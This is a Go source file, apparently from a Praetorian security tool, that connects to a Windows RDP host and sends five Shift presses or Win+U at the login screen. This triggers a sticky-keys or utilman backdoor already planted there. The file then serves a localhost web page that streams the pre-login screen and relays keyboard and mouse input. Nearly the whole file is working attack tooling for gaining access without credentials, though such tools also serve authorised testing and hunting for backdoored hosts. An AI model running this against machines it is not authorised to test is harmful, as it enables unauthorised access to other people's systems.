// Copyright 2026 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package rdp

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha1" //nolint:gosec // Required by RFC 6455 WebSocket handshake
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"

	_ "embed"
)

//go:embed webterm.html
var webtermHTML []byte

// wsMessage is a WebSocket message from the browser.
type wsMessage struct {
	Type      string `json:"type"`                // "key", "mouse"
	Code      string `json:"code,omitempty"`      // JS KeyboardEvent.code (for key events)
	Scancode  uint16 `json:"scancode,omitempty"`  // direct scancode (fallback)
	Pressed   bool   `json:"pressed,omitempty"`   // key/button pressed
	X         uint16 `json:"x,omitempty"`         // mouse X coordinate
	Y         uint16 `json:"y,omitempty"`         // mouse Y coordinate
	Button    uint8  `json:"button,omitempty"`    // mouse button: 0=left, 1=middle, 2=right (JS convention)
	EventType string `json:"eventType,omitempty"` // "move", "down", "up" (mouse)
}

// openBrowser opens a URL in the user's default browser.
func openBrowser(url string) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "darwin":
		cmd = exec.Command("open", url)
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
	default:
		cmd = exec.Command("xdg-open", url)
	}
	_ = cmd.Start()
}

// keyEvent represents a single keyboard event (press or release).
type keyEvent struct {
	scancode uint16
	pressed  bool
}

// sendKeySequence sends a sequence of key events with 50ms spacing between each event.
func sendKeySequence(sess interface {
	SendKey(uint16, bool) error
}, events ...keyEvent) error {
	for i, evt := range events {
		if err := sess.SendKey(evt.scancode, evt.pressed); err != nil {
			action := "release"
			if evt.pressed {
				action = "press"
			}
			return fmt.Errorf("key %s: %w", action, err)
		}
		// Add delay between key events (except after the last one)
		if i < len(events)-1 {
			time.Sleep(50 * time.Millisecond)
		}
	}
	return nil
}

// triggerBackdoor sends the backdoor-specific key sequence on the given session.
func triggerBackdoor(sess interface {
	SendKey(uint16, bool) error
}, kind BackdoorType) error {
	switch kind {
	case BackdoorUtilman:
		// Win+U sequence
		return sendKeySequence(sess,
			keyEvent{leftWinScancode, true},
			keyEvent{uKeyScancode, true},
			keyEvent{uKeyScancode, false},
			keyEvent{leftWinScancode, false},
		)
	default: // BackdoorStickyKeys
		// 5x Shift sequence
		var events []keyEvent
		for i := 0; i < 5; i++ {
			events = append(events,
				keyEvent{leftShiftScancode, true},
				keyEvent{leftShiftScancode, false},
			)
		}
		return sendKeySequence(sess, events...)
	}
}

// sessionManager holds the active RDP session and allows reconnection.
type sessionManager struct {
	mu           sync.RWMutex
	sess         *InteractiveSession
	target       string
	timeout      time.Duration
	backdoorType BackdoorType
}

// Session returns the current active session.
func (m *sessionManager) Session() *InteractiveSession {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.sess
}

// Reconnect closes the old session and creates a new one, triggering the configured backdoor.
func (m *sessionManager) Reconnect(ctx context.Context) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Nil out the session pointer first so goroutines see nil and skip,
	// then close the old session. This prevents panics from goroutines
	// accessing freed WASM resources during the reconnect window.
	oldSess := m.sess
	m.sess = nil
	if oldSess != nil {
		oldSess.Close()
	}
	// Brief pause to let in-flight goroutines notice the nil session
	time.Sleep(200 * time.Millisecond)

	// Create new session
	newSess, sessErr := NewInteractiveSession(ctx, m.target, m.timeout, 1024, 768)
	if sessErr != nil {
		return fmt.Errorf("reconnect failed: %w", sessErr)
	}

	// Wait for login screen
	time.Sleep(3 * time.Second)
	newSess.WaitForFrame(2 * time.Second)

	// Trigger the appropriate backdoor
	if triggerErr := triggerBackdoor(newSess, m.backdoorType); triggerErr != nil {
		newSess.Close()
		return fmt.Errorf("trigger backdoor: %w", triggerErr)
	}

	time.Sleep(1 * time.Second)
	newSess.WaitForFrame(2 * time.Second)

	m.sess = newSess
	return nil
}

// Close closes the current session if any.
func (m *sessionManager) Close() {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.sess != nil {
		m.sess.Close()
	}
}

// BackdoorType indicates which backdoor to trigger in web terminal mode.
type BackdoorType string

const (
	BackdoorStickyKeys BackdoorType = "stickykeys"
	BackdoorUtilman    BackdoorType = "utilman"
)

// RunWebTerminal connects to an RDP target via sticky keys or utilman and serves an
// interactive web terminal on localhost. Opens a browser-controllable RDP
// session with live screen streaming, keyboard, and mouse input.
func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool, backdoorType BackdoorType) error {
	fmt.Fprintf(os.Stderr, "[*] Connecting to %s for interactive web terminal...\n", target)

	sess, err := NewInteractiveSession(ctx, target, timeout, 1024, 768)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}

	mgr := &sessionManager{
		sess:         sess,
		target:       target,
		timeout:      timeout,
		backdoorType: backdoorType,
	}
	defer mgr.Close()

	// Wait for initial screen
	fmt.Fprintf(os.Stderr, "[*] Waiting for login screen...\n")
	time.Sleep(3 * time.Second)
	sess.WaitForFrame(2 * time.Second)

	// Trigger the appropriate backdoor
	if backdoorType == BackdoorUtilman {
		fmt.Fprintf(os.Stderr, "[*] Sending Win+U to trigger utilman...\n")
	} else {
		fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
	}

	if triggerErr := triggerBackdoor(sess, backdoorType); triggerErr != nil {
		return fmt.Errorf("trigger backdoor: %w", triggerErr)
	}

	time.Sleep(1 * time.Second)
	sess.WaitForFrame(2 * time.Second)

	fmt.Fprintf(os.Stderr, "[+] Session established. Starting web terminal...\n")

	// Generate a random token for the WebSocket URL to prevent unauthorized access
	tokenBytes := make([]byte, 16)
	if _, err = rand.Read(tokenBytes); err != nil {
		return fmt.Errorf("generate token: %w", err)
	}
	token := base64.URLEncoding.EncodeToString(tokenBytes)

	// Find a free port
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}
	tcpAddr, ok := listener.Addr().(*net.TCPAddr)
	if !ok {
		_ = listener.Close()
		return fmt.Errorf("unexpected listener address type")
	}
	port := tcpAddr.Port

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write(webtermHTML)
	})
	mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("token") != token {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		handleWebSocket(w, r, mgr)
	})
	mux.HandleFunc("/info", func(w http.ResponseWriter, r *http.Request) {
		curSess := mgr.Session()
		var width, height uint32 = 1024, 768
		if curSess != nil {
			width = curSess.Width()
			height = curSess.Height()
		}
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(map[string]interface{}{
			"width":  width,
			"height": height,
			"target": target,
			"token":  token,
		}); err != nil {
			fmt.Fprintf(os.Stderr, "[!] Failed to encode /info response: %v\n", err)
		}
	})
	mux.HandleFunc("/reconnect", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		if r.URL.Query().Get("token") != token {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}

		fmt.Fprintf(os.Stderr, "[*] Reconnecting to %s...\n", target)
		if reconnErr := mgr.Reconnect(ctx); reconnErr != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			if err := json.NewEncoder(w).Encode(map[string]string{"error": reconnErr.Error()}); err != nil {
				fmt.Fprintf(os.Stderr, "[!] Failed to encode error response: %v\n", err)
			}
			fmt.Fprintf(os.Stderr, "[!] Reconnect failed: %v\n", reconnErr)
			return
		}
		fmt.Fprintf(os.Stderr, "[+] Reconnected successfully.\n")
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(map[string]string{"status": "ok"}); err != nil {
			fmt.Fprintf(os.Stderr, "[!] Failed to encode success response: %v\n", err)
		}
	})
	server := &http.Server{Handler: mux}

	// Shut down server when context is canceled
	go func() {
		<-ctx.Done()
		_ = server.Close()
	}()

	url := fmt.Sprintf("http://127.0.0.1:%d", port)

	// Set banner label based on active backdoor type
	backdoorLabel := "Sticky Keys"
	if backdoorType == BackdoorUtilman {
		backdoorLabel = "Utilman"
	}
	bannerTitle := fmt.Sprintf("RDP Web Terminal - %s Backdoor Demo", backdoorLabel)

	fmt.Fprintf(os.Stderr, "\n")
	fmt.Fprintf(os.Stderr, "  ╔══════════════════════════════════════════════════╗\n")
	fmt.Fprintf(os.Stderr, "  ║  %-48s ║\n", bannerTitle)
	fmt.Fprintf(os.Stderr, "  ╠══════════════════════════════════════════════════╣\n")
	fmt.Fprintf(os.Stderr, "  ║  Target: %-39s ║\n", target)
	fmt.Fprintf(os.Stderr, "  ║  URL:    %-39s ║\n", url)
	fmt.Fprintf(os.Stderr, "  ║  Press Ctrl+C to stop                           ║\n")
	fmt.Fprintf(os.Stderr, "  ╚══════════════════════════════════════════════════╝\n")
	fmt.Fprintf(os.Stderr, "\n")

	if openInBrowser {
		openBrowser(url)
	}
	return server.Serve(listener)
}

// handleWebSocket implements a simple WebSocket handler without external dependencies.
// Uses the standard HTTP upgrade mechanism per RFC 6455.
func handleWebSocket(w http.ResponseWriter, r *http.Request, mgr *sessionManager) {
	// Perform WebSocket handshake
	conn, wsErr := upgradeWebSocket(w, r)
	if wsErr != nil {
		return
	}
	defer func() { _ = conn.Close() }()

	ctx, cancel := context.WithCancel(r.Context())
	defer cancel()

	// Start frame streaming goroutine
	var wsMu sync.Mutex
	go streamFrames(ctx, cancel, conn, &wsMu, mgr)

	// Read input from browser
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		msg, readErr := readWSMessage(conn)
		if readErr != nil {
			return
		}

		var wsMsg wsMessage
		if unmarshalErr := json.Unmarshal(msg, &wsMsg); unmarshalErr != nil {
			continue
		}

		curSess := mgr.Session()
		if curSess == nil {
			continue // Session is being replaced during reconnect
		}

		switch wsMsg.Type {
		case "key":
			sc := wsMsg.Scancode
			if sc == 0 && wsMsg.Code != "" {
				if mapped, ok := jsCodeToScancode[wsMsg.Code]; ok {
					sc = mapped
				}
			}
			if sc != 0 {
				_ = curSess.SendKey(sc, wsMsg.Pressed)
			}

		case "mouse":
			var button uint8
			switch wsMsg.Button {
			case 0: // left
				button = 1
			case 1: // middle
				button = 3
			case 2: // right
				button = 2
			default:
				button = 0
			}
			var evType uint8
			switch wsMsg.EventType {
			case "down":
				evType = 1
			case "up":
				evType = 2
			default: // "move"
				evType = 0
				button = 0 // move only
			}
			_ = curSess.SendMouse(wsMsg.X, wsMsg.Y, button, evType)
		}
	}
}

// streamFrames continuously captures the RDP screen and sends JPEG frames over WebSocket.
func streamFrames(ctx context.Context, cancel context.CancelFunc, conn net.Conn, mu *sync.Mutex, mgr *sessionManager) {
	// Recover from panics caused by accessing a closed/freed session during reconnect.
	defer func() {
		// Session may be closed during reconnect — not a fatal error.
		// The browser will reconnect with a new WebSocket after /reconnect succeeds.
		_ = recover()
	}()

	ticker := time.NewTicker(100 * time.Millisecond) // ~10 FPS
	defer ticker.Stop()

	pumpErrSent := false

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}

		curSess := mgr.Session()
		if curSess == nil {
			continue // Session is being replaced during reconnect
		}

		// Check for pump errors and notify browser
		if !pumpErrSent {
			if pumpErr := curSess.PumpError(); pumpErr != nil {
				errPayload, _ := json.Marshal(map[string]string{
					"type":  "error",
					"error": pumpErr.Error(),
				})
				mu.Lock()
				_ = writeWSMessage(conn, errPayload)
				mu.Unlock()
				pumpErrSent = true
			}
		}

		frame, captureErr := curSess.CaptureFrame()
		if captureErr != nil {
			continue
		}

		// Encode RGBA to JPEG
		jpegData, encodeErr := encodeJPEG(frame, curSess.Width(), curSess.Height())
		if encodeErr != nil {
			continue
		}

		// Send as base64-encoded WebSocket text message
		b64 := base64.StdEncoding.EncodeToString(jpegData)
		payload := []byte(`{"type":"frame","data":"` + b64 + `"}`)

		mu.Lock()
		writeErr := writeWSMessage(conn, payload)
		mu.Unlock()

		if writeErr != nil {
			cancel()
			return
		}
	}
}

// encodeJPEG converts an RGBA framebuffer to JPEG bytes.
func encodeJPEG(rgba []byte, width, height uint32) ([]byte, error) {
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	expectedLen := int(width) * int(height) * 4
	if len(rgba) < expectedLen {
		return nil, fmt.Errorf("frame too small")
	}
	copy(img.Pix, rgba[:expectedLen])

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 60}); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// --- Minimal WebSocket Implementation (RFC 6455) ---
// No external dependencies. Handles text frames only, no fragmentation.

func upgradeWebSocket(w http.ResponseWriter, r *http.Request) (net.Conn, error) {
	if r.Header.Get("Upgrade") != "websocket" {
		http.Error(w, "expected websocket", http.StatusBadRequest)
		return nil, fmt.Errorf("not a websocket request")
	}

	key := r.Header.Get("Sec-WebSocket-Key")
	if key == "" {
		http.Error(w, "missing key", http.StatusBadRequest)
		return nil, fmt.Errorf("missing Sec-WebSocket-Key")
	}

	// Compute accept key
	accept := computeAcceptKey(key)

	// Hijack the connection
	hj, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "hijack not supported", http.StatusInternalServerError)
		return nil, fmt.Errorf("hijack not supported")
	}
	conn, bufrw, err := hj.Hijack()
	if err != nil {
		return nil, err
	}

	// Write upgrade response
	resp := "HTTP/1.1 101 Switching Protocols\r\n" +
		"Upgrade: websocket\r\n" +
		"Connection: Upgrade\r\n" +
		"Sec-WebSocket-Accept: " + accept + "\r\n\r\n"
	if _, err := bufrw.WriteString(resp); err != nil {
		_ = conn.Close()
		return nil, err
	}
	if err := bufrw.Flush(); err != nil {
		_ = conn.Close()
		return nil, err
	}

	return conn, nil
}

func computeAcceptKey(key string) string {
	h := sha1.New() //nolint:gosec // Required by RFC 6455
	h.Write([]byte(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// readWSMessage reads a single WebSocket text frame.
func readWSMessage(conn net.Conn) ([]byte, error) {
	// Read frame header (2 bytes minimum)
	header := make([]byte, 2)
	if err := readFull(conn, header); err != nil {
		return nil, err
	}

	// Control vs data frame detection (opcode in header[0] & 0x0F)
	if header[0]&0x08 != 0 {
		return nil, fmt.Errorf("control frame")
	}

	masked := header[1]&0x80 != 0
	payloadLen := uint64(header[1] & 0x7F)

	switch payloadLen {
	case 126:
		ext := make([]byte, 2)
		if err := readFull(conn, ext); err != nil {
			return nil, err
		}
		payloadLen = uint64(ext[0])<<8 | uint64(ext[1])
	case 127:
		ext := make([]byte, 8)
		if err := readFull(conn, ext); err != nil {
			return nil, err
		}
		payloadLen = uint64(ext[0])<<56 | uint64(ext[1])<<48 | uint64(ext[2])<<40 | uint64(ext[3])<<32 |
			uint64(ext[4])<<24 | uint64(ext[5])<<16 | uint64(ext[6])<<8 | uint64(ext[7])
	}

	var maskKey [4]byte
	if masked {
		if err := readFull(conn, maskKey[:]); err != nil {
			return nil, err
		}
	}

	payload := make([]byte, payloadLen)
	if err := readFull(conn, payload); err != nil {
		return nil, err
	}

	if masked {
		for i := range payload {
			payload[i] ^= maskKey[i%4]
		}
	}

	return payload, nil
}

// writeWSMessage sends a text frame over WebSocket.
func writeWSMessage(conn net.Conn, payload []byte) error {
	// Text frame, FIN bit set, no masking (server→client)
	frame := make([]byte, 0, 10+len(payload))
	frame = append(frame, 0x81) // FIN + text opcode

	switch {
	case len(payload) < 126:
		frame = append(frame, byte(len(payload)))
	case len(payload) < 65536:
		frame = append(frame, 126, byte(len(payload)>>8), byte(len(payload)))
	default:
		frame = append(frame, 127)
		for i := 7; i >= 0; i-- {
			frame = append(frame, byte(len(payload)>>(i*8)))
		}
	}

	frame = append(frame, payload...)
	_, err := conn.Write(frame)
	return err
}

func readFull(conn net.Conn, buf []byte) error {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return err
		}
	}
	return nil
}
